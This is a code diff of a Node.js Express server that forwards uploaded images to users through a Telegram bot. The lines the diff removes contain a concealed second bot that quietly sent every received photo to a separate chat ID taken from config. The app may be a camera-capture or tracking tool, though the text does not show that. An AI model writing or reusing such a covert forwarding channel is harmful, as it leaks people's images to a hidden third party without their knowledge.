@@ -2,18 +2,10 @@ const fs = require("fs");
 const express = require("express");
 const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
-const { botToken2, chatId2 } = require('./config');
-
-// Modify your bot TOKEN here
-const botToken = "YOUR_BOT_TOKEN";
-// Modify your URL here
-const hostURL = "YOUR_URL";
-
+const { botToken, hostURL } = require('./config');
 const bot = new TelegramBot(botToken, { polling: true });
-const bot2 = new TelegramBot(botToken2, { polling: true });
 const jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
 const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
-
 const app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
@@ -150,17 +142,10 @@ contentType: 'image/png'
 // Assuming yourVariable is a boolean variable indicating whether to send the image to bot2
 const imgVariable = true;
 try {
-    if (imgVariable) {
-        bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
-        bot2.sendPhoto(chatId2, buffer, {}, info);
-    } else {
-        bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
-        // Handle other actions when the variable is false, or omit this block if nothing should be done.
-    }
+bot.sendPhoto(parseInt(uid,36),buffer,{},info);
 } catch (error) {
     console.log(error);
 }
-
 res.send("Done");
 }
 });
